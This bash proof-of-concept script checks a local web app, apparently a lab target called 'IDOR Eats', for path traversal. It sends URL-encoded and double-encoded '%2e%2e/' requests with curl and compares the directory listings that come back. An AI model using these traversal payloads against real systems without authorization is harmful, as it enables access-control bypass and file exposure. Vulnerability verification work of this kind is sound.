#!/bin/bash

# POC: Path Traversal via URL Encoding - Access Control Bypass
# Tests for directory traversal using URL-encoded dot sequences (%2e%2e/)
# Target: http://localhost:8080/api/

TARGET_URL="http://localhost:8080"
API_PATH="/api"

echo "=========================================="
echo "Path Traversal URL Encoding POC"
echo "=========================================="
echo ""

# Test 1: Normal /api/ request (expected behavior - shows API directory)
echo "[*] Test 1: Normal /api/ request (baseline)"
echo "URL: $TARGET_URL$API_PATH/"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_PATH/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "Index of /api"; then
    echo "Result: API directory listing shown"
    echo "Content preview: $(echo "$BODY" | head -c 200)..."
else
    echo "Result: Response does not show /api directory listing"
fi
echo ""

# Test 2: Path traversal with URL-encoded sequences (%2e%2e/)
echo "[*] Test 2: Path traversal using URL-encoded sequences (%2e%2e/)"
echo "URL: $TARGET_URL$API_PATH/%2e%2e/"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_PATH/%2e%2e/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "Result: SUCCESS - Request returned 200"
    
    # Check if we got root directory content instead of /api/
    if echo "$BODY" | grep -q "Index of /"; then
        echo "Traversal successful: Got root directory listing instead of /api/"
        echo "Content preview: $(echo "$BODY" | head -c 300)..."
        TRAVERSAL_SUCCESS=1
    elif echo "$BODY" | grep -q "<!DOCTYPE html\|<html\|IDOR Eats\|Restaurant"; then
        echo "Traversal successful: Got root content (homepage/index page)"
        echo "Content preview: $(echo "$BODY" | head -c 300)..."
        TRAVERSAL_SUCCESS=1
    else
        echo "Got 200 response but content unclear"
        echo "Content preview: $(echo "$BODY" | head -c 300)..."
        TRAVERSAL_SUCCESS=1
    fi
else
    echo "Result: FAILED - Request returned $HTTP_CODE (not 200)"
    echo "Response: $(echo "$BODY" | head -c 200)..."
    TRAVERSAL_SUCCESS=0
fi
echo ""

# Test 3: Verify encoding interpretation
echo "[*] Test 3: URL Encoding Verification"
echo "Encoded sequence breakdown:"
echo "  %2e = . (dot character)"
echo "  %2e%2e = .. (parent directory reference)"
echo "  /api/%2e%2e/ = /api/../ after URL decoding"
echo "  /api/../ = / after path normalization"
echo ""

# Test 4: Double encoding variant (%252e%252e)
echo "[*] Test 4: Double encoding variant (%252e%252e/) - advanced bypass"
echo "URL: $TARGET_URL$API_PATH/%252e%252e/"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL$API_PATH/%252e%252e/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "Result: Double encoding also succeeds (200)"
    DOUBLE_ENCODE_SUCCESS=1
else
    echo "Result: Double encoding blocked ($HTTP_CODE)"
    DOUBLE_ENCODE_SUCCESS=0
fi
echo ""

# Test 5: Compare responses - verify we escaped /api/
echo "[*] Test 5: Response Comparison"
echo "Fetching /api/ directory listing..."
API_RESPONSE=$(curl -s "$TARGET_URL$API_PATH/")
API_FILES=$(echo "$API_RESPONSE" | grep -oP '(?<=href=")[^"]*\.php' | sort | tr '\n' ', ')

echo "Expected API files in /api/: $API_FILES"
echo ""

echo "Fetching root via /api/%2e%2e/"
ROOT_RESPONSE=$(curl -s "$TARGET_URL$API_PATH/%2e%2e/")

if ! echo "$ROOT_RESPONSE" | grep -q "change_password.php\|get_favorite_restaurants.php"; then
    echo "Confirmed: Root response does NOT contain API files"
    echo "This proves we escaped the /api/ directory"
else
    echo "Root response contains API files - may still be in API scope"
fi
echo ""

# Final verdict
echo "=========================================="
echo "EXPLOITATION SUMMARY"
echo "=========================================="
if [ "$TRAVERSAL_SUCCESS" = "1" ]; then
    echo "[+] VULNERABLE: Path traversal via URL encoding (%2e%2e/) SUCCESSFUL"
    echo "[+] Attack Vector: /api/%2e%2e/ successfully escapes to root"
    echo "[+] Impact: Access control bypass - can access files outside /api/ namespace"
    exit 0
else
    echo "[-] Traversal attempt did not succeed as expected"
    exit 1
fi